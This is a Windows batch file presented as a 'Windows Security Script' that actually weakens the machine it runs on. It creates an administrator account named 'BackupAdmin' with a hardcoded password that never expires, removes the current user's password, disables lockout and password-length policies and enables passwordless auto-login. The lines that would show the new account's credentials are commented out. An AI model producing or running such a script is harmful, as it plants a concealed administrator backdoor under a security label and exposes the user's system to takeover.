@echo off
title Windows Security Script
color 0A

echo.
echo ==========================================
echo  Windows Security Script
echo ==========================================
echo.
echo This will:
echo - Remove password from current user
echo - Create backup admin account
echo - Disable password policies
echo - Set up auto-login
echo.
echo Press any key to continue...
pause >nul

REM Check admin privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo ERROR: Run as administrator
    pause
    exit
)

echo.
echo Starting configuration...
echo.

REM Get current username
for /f "tokens=*" %%i in ('echo %USERNAME%') do set "currentUser=%%i"
echo Target User: %currentUser%
echo.

REM Create backup admin
echo Creating backup admin...
set "backupUser=BackupAdmin"
set "backupPass=BackupPass123!"

net user "%backupUser%" "%backupPass%" /add >nul 2>&1
if %errorLevel% equ 0 (
    echo ✓ Backup user created: %backupUser%
    net localgroup administrators "%backupUser%" /add >nul 2>&1
    net user "%backupUser%" /expires:never >nul 2>&1
    echo ✓ Added to administrators group
    

) else (
    echo ✗ Failed to create backup user
)

echo.
echo Removing password from %currentUser%...
net user "%currentUser%" "" >nul 2>&1
if %errorLevel% equ 0 (
    echo ✓ Password removed successfully
) else (
    echo ✗ Failed to remove password
)

echo.
echo Disabling password policies...
net accounts /lockoutthreshold:0 >nul 2>&1
net accounts /lockoutduration:0 >nul 2>&1
net accounts /lockoutwindow:0 >nul 2>&1
net accounts /minpwage:0 >nul 2>&1
net accounts /maxpwage:unlimited >nul 2>&1
net accounts /minpwlen:0 >nul 2>&1
echo ✓ Password policies disabled

echo.
echo Setting up auto-login...
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d "1" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d "%currentUser%" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d "" /f >nul 2>&1
echo ✓ Auto-login configured

echo.
echo ==========================================
echo  CONFIGURATION COMPLETE!
echo ==========================================
echo.
echo IMPORTANT NOTES:
rem echo 1. Backup admin: %backupUser%
rem echo 2. Backup password: %backupPass%
echo 1. Restart required for changes
echo.

set /p restart="Restart computer now? (y/n): "
if /i "%restart%"=="y" (
    echo Restarting now...
    shutdown /r /t 0
) else (
    echo Please restart manually when ready
)

echo.
pause